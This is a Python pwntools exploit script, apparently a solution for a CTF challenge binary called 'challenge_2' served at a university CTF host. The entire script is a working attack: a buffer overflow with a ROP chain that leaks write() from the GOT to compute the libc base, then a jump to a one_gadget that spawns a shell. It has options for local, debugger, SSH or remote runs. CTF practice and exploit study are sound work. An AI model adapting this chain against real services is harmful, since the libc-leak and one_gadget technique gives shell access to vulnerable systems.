import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
gdb_cmd = [
	"c"
]

# Binary names
bin_fname = './challenge_2'
libc_fname = './libc.so.6'

# Remote
IP = 'university.opentoallctf.com'
PORT = 30002

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args, env={"LD_PRELOAD" : libc_fname}) if libc_fname else process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd), env={"LD_PRELOAD" : libc_fname}) if libc_fname else gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	p.recvline() # Read "Remote debugging from 127.0.0.1" string

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

pop_rdi = 0x00000000004005a9
pop_rdx = 0x00000000004005ad
pop_rsi = 0x00000000004005ab
pop_rax = 0x00000000004005a7

# p.sendline(cyclic(100, n=8 if x64 else 4))
buf = (cyclic_find('caaaaaaa', n=8 if x64 else 4)) * 'a'

# Leak address of write function - write(1, &write, 8)
buf += p64(pop_rdi)
buf += p64(1)
buf += p64(pop_rsi)
buf += p64(e.got['write'])
buf += p64(pop_rdx)
buf += p64(8)

buf += p64(e.plt['write'])
buf += p64(0x400574)
print(p.recvuntil('Give me some data:\n'))
p.send(buf)

write_addr = u64(p.recvn(8))
log.info('Write Address: ' + hex(write_addr))

libc_base = write_addr - libc.symbols['write']
log.info('Libc Address:  ' + hex(libc_base))

shell = libc_base + 0x45216
log.info('Shell Address: ' + hex(shell))

# Set $rax to NULL (one_gadget constraint)
print(p.recvuntil('Give me some data:\n'))

buf = (cyclic_find('caaaaaaa', n=8 if x64 else 4)) * 'a'
buf += p64(pop_rax)
buf += p64(0)

# Jump to one_gadget
buf += p64(shell)
buf += p64(libc_base + libc.symbols['exit'])
p.sendline(buf)

# Send buffer and interact
p.interactive()
